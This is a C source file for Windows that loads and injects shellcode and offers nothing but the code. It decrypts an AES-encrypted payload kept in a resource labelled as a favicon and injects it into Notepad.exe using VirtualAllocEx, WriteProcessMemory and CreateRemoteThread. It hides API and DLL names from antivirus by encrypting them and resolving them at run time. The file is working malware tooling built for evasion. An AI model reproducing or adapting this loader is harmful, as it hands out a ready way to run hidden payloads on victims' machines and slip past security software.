#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "resources.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

LPVOID (WINAPI * pVirtualAlloc)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

BOOL (WINAPI * pProcess32First)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pProcess32Next)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

HRSRC (WINAPI * pFindResourceA)(
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

HGLOBAL (WINAPI * pLoadResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

LPVOID (WINAPI * pLockResource)(
  HGLOBAL hResData
);

DWORD (WINAPI * pSizeofResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

VOID (WINAPI * pRtlMoveMemory)(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T Length
);

BOOL (WINAPI * pCloseHandle)(
  HANDLE hObject
);

DWORD (WINAPI * pWaitForSingleObject)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

HANDLE (WINAPI * pOpenProcess)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

char pkey[] = { 0xad, 0xe0, 0x97, 0x55, 0x3, 0x64, 0xc9, 0xfb, 0x1f, 0x69, 0x77, 0xc6, 0x6a, 0x26, 0x97, 0xba };
char k[] = { 0xb3, 0xd, 0x7d, 0x9, 0x3, 0x6a, 0xf3, 0x9d, 0x6, 0x10, 0x44, 0x8, 0x3b, 0x91, 0x4f, 0x8f };

//// AES ENCR FUNCTIONS
unsigned char sVirtualAllocEx[] = { 0x13, 0x7e, 0xa2, 0xe3, 0xb1, 0x94, 0xb8, 0x9f, 0xea, 0xc3, 0xfc, 0xe0, 0xe0, 0x29, 0xaa, 0x15 };
unsigned char sWriteProcessMemory[] = { 0xd5, 0xbf, 0x42, 0x6f, 0x5e, 0x3e, 0x7, 0xc9, 0xa2, 0xe3, 0xea, 0x85, 0xc7, 0xc6, 0x82, 0xea, 0xc7, 0x5f, 0x92, 0x2f, 0x98, 0x72, 0xde, 0x93, 0xd4, 0x49, 0x9f, 0xb4, 0x3d, 0x59, 0x98, 0x8c };
unsigned char sCreateRemoteThread[] = { 0x74, 0xf, 0x4a, 0xcd, 0xdf, 0x1c, 0x7a, 0xf, 0x45, 0x97, 0x47, 0xd3, 0x99, 0x11, 0x91, 0x58, 0xb2, 0x40, 0xf3, 0x6c, 0x5a, 0x99, 0xcb, 0x33, 0x36, 0x96, 0x9, 0x7d, 0xba, 0x23, 0x20, 0xf1 };
unsigned char sOpenProcess[] = { 0xa0, 0x22, 0x50, 0x2a, 0x92, 0xdc, 0xc0, 0x9d, 0x9b, 0x1d, 0x99, 0x98, 0x33, 0x3b, 0x73, 0x3c };
unsigned char sFindResourceA[] = { 0x37, 0x34, 0x50, 0x9, 0x4f, 0xf4, 0x78, 0xe8, 0x62, 0xed, 0x36, 0x41, 0xb7, 0xae, 0xba, 0x78 };
unsigned char sLoadResource[] = { 0x1c, 0x43, 0x4c, 0xa1, 0x79, 0x68, 0xe8, 0x6d, 0xda, 0x80, 0xd4, 0x6c, 0xd7, 0x47, 0xfb, 0xff };
unsigned char sLockResource[] = { 0xba, 0x40, 0x70, 0x29, 0xa9, 0x6d, 0xed, 0x2d, 0x4b, 0x54, 0x53, 0xf2, 0x15, 0x14, 0xed, 0x7c };
unsigned char sSizeofResource[] = { 0xa2, 0xb6, 0x61, 0x43, 0x1c, 0x69, 0x41, 0xde, 0xd0, 0xad, 0xc, 0xa8, 0xbc, 0xc4, 0x75, 0xdb };
unsigned char sVirtualAlloc[] = { 0x28, 0xbc, 0x1f, 0x37, 0xa3, 0x49, 0xf3, 0xbb, 0x46, 0x71, 0xb9, 0x8, 0x5b, 0x6a, 0x21, 0x48 };
unsigned char sRtlMoveMemory[] = { 0x7e, 0xbf, 0x82, 0xab, 0x30, 0xb9, 0xbf, 0xfd, 0x95, 0x43, 0x42, 0x87, 0x4b, 0x74, 0x77, 0x4d };
unsigned char sWaitForSingleObject[] = { 0xd3, 0xa6, 0x40, 0xac, 0x36, 0x71, 0xf0, 0xf4, 0x93, 0x46, 0xe1, 0xe1, 0xa0, 0x57, 0xc3, 0x79, 0xb6, 0x28, 0x97, 0x86, 0x5e, 0xda, 0xe6, 0xc3, 0x35, 0x5c, 0xbb, 0x50, 0xd6, 0xa5, 0x0, 0x57 };
unsigned char sCloseHandle[] = { 0x7e, 0xec, 0x47, 0x8b, 0x9a, 0x3e, 0x38, 0x3b, 0xcb, 0xa0, 0x40, 0x2d, 0x19, 0xb4, 0xe, 0xbb };
unsigned char sCreateToolhelp32Snapshot[] = { 0xdc, 0x1f, 0x1d, 0xec, 0xb0, 0x1a, 0xb, 0x4b, 0x38, 0x5e, 0xd1, 0x68, 0xf7, 0xd7, 0x1e, 0x7b, 0x76, 0xf8, 0x5, 0x95, 0x1f, 0xef, 0x2f, 0x86, 0xf3, 0xe1, 0x94, 0x14, 0xea, 0x33, 0xfd, 0xf6 };
unsigned char sProcess32First[] = { 0xb2, 0x84, 0xf0, 0x9a, 0xb7, 0xad, 0x82, 0x56, 0xf7, 0x6d, 0x63, 0x1f, 0xc8, 0x4, 0x29, 0xe3 };
unsigned char sProcess32Next[] = { 0x17, 0x83, 0x40, 0x4, 0x49, 0x27, 0xaa, 0xee, 0xbe, 0x28, 0x57, 0x2b, 0xf9, 0x7d, 0xdd, 0xce };

//// AES ENCR STRINGS
unsigned char sKdll[] =  { 0x52, 0x7e, 0x4f, 0x12, 0x0, 0x93, 0xf3, 0xbd, 0xa6, 0xe2, 0x67, 0x4f, 0x1f, 0x8f, 0x50, 0x1f }; //kernel32.dll
unsigned char sNdll[] =  { 0xc0, 0x8a, 0xbf, 0x33, 0xa3, 0xf9, 0xc6, 0x5a, 0xb9, 0x2e, 0x62, 0xc2, 0xce, 0x32, 0x54, 0x35 }; //Ntdll.dll
unsigned char sPrNa[] =  { 0x76, 0x80, 0x85, 0xa5, 0xc2, 0xdb, 0x53, 0x23, 0xb, 0xd1, 0x62, 0x4f, 0xba, 0x9b, 0x6b, 0xe0 }; //Notepad.exe

int AESDecrypt(char * payl, unsigned int payl_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payl, &payl_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int GePr(const char *pname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
		
		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), k, sizeof(k)); // THIS ONE DOESN'T WORK?
		AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), k, sizeof(k));
		AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), k, sizeof(k));
		AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), k, sizeof(k));
		
		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(sKdll), sCreateToolhelp32Snapshot);
		pProcess32First = GetProcAddress(GetModuleHandle(sKdll), sProcess32First);
		pProcess32Next = GetProcAddress(GetModuleHandle(sKdll), sProcess32Next);
		pCloseHandle = GetProcAddress(GetModuleHandle(sKdll), sCloseHandle);
                
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(pname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int Inj(HANDLE hProc, unsigned char * payl, unsigned int payl_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
		
		AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), k, sizeof(k));
		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), k, sizeof(k));
		AESDecrypt((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), k, sizeof(k));
		AESDecrypt((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), k, sizeof(k));
		AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), k, sizeof(k));

		pVirtualAllocEx = GetProcAddress(GetModuleHandle(sKdll), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(sKdll), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(sKdll), sCreateRemoteThread);
		pWaitForSingleObject = GetProcAddress(GetModuleHandle(sKdll), sWaitForSingleObject);
		pCloseHandle = GetProcAddress(GetModuleHandle(sKdll), sCloseHandle);
  
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payl_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payl, (SIZE_T)payl_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
    
	void * emem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payl;
	unsigned int payl_len;
	
	int pid = 0;
    HANDLE hProc = NULL;
	
	AESDecrypt((char *) sFindResourceA, sizeof(sFindResourceA), k, sizeof(k));
	AESDecrypt((char *) sLoadResource, sizeof(sLoadResource), k, sizeof(k));
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), k, sizeof(k));
	AESDecrypt((char *) sSizeofResource, sizeof(sSizeofResource), k, sizeof(k));
	AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), k, sizeof(k));
	AESDecrypt((char *) sOpenProcess, sizeof(sOpenProcess), k, sizeof(k));
	AESDecrypt((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), k, sizeof(k));
	
	AESDecrypt((char *) sKdll, sizeof(sKdll), k, sizeof(k));
	AESDecrypt((char *) sNdll, sizeof(sNdll), k, sizeof(k));
	AESDecrypt((char *) sPrNa, sizeof(sPrNa), k, sizeof(k));
	
	pFindResourceA = GetProcAddress(GetModuleHandle(sKdll), sFindResourceA);
	pLoadResource = GetProcAddress(GetModuleHandle(sKdll), sLoadResource);
	pLockResource = GetProcAddress(GetModuleHandle(sKdll), sLockResource);
	pSizeofResource = GetProcAddress(GetModuleHandle(sKdll), sSizeofResource);
	pVirtualAlloc = GetProcAddress(GetModuleHandle(sKdll), sVirtualAlloc);
	pOpenProcess = GetProcAddress(GetModuleHandle(sKdll), sOpenProcess);
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(sNdll), sRtlMoveMemory);
	
	// Extract payl from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payl = (char *) pLockResource(resHandle);
	payl_len = pSizeofResource(NULL, res);
	
	// Allocate some memory buffer for payl
	emem = pVirtualAlloc(0, payl_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payl to new memory buffer
	pRtlMoveMemory(emem, payl, payl_len);
	
	// Decrypt (DeXOR) the payl
	AESDecrypt((char *) emem, payl_len, pkey, sizeof(pkey));
	
	// Inject process starts here...
	pid = GePr(sPrNa);
	
	if (pid) {
		
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inj(hProc, emem, payl_len);
			pCloseHandle(hProc);
		}
	}

	return 0;
}